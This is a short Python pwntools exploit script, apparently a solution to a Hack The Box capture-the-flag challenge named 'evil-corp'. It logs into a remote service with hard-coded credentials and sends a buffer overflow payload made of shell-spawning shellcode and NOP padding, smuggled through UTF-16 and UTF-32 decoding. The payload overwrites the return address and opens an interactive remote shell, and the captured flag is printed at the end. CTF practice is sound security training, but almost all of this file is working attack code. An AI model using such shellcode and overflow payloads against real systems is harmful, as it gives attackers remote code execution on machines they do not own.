from pwn import *

context.arch = 'amd64'

#io = process('./evil-corp')
#io = gdb.debug('./evil-corp', 'break main')
ip, port = '94.237.55.163', 57833
io = remote(ip, port)

io.sendlineafter('Username: ', 'eliot')
io.sendlineafter('Password: ', '4007')
io.sendlineafter('>> ', '2')
io.recvline()
io.recvline()
io.recvline()
io.recvline()

#buffer offsets (bytes)
#4000*4 + 8 + rip

shellcode = asm(shellcraft.popad()) #context.arch = 'amd64' and popad() needed! a singal craft.sh doesn't work!
shellcode += asm(shellcraft.sh()) #56
shellcode += b'\x90'*44

byte_data = shellcode*80+b'A'*4
buf0 = byte_data.decode('utf-16-le')

byte_data = p64(0x11000)
buf = buf0 + byte_data.decode('utf-32-le')

io.sendline(buf)
io.interactive()

#HTB{45c11_15_N07_4L0000n3}
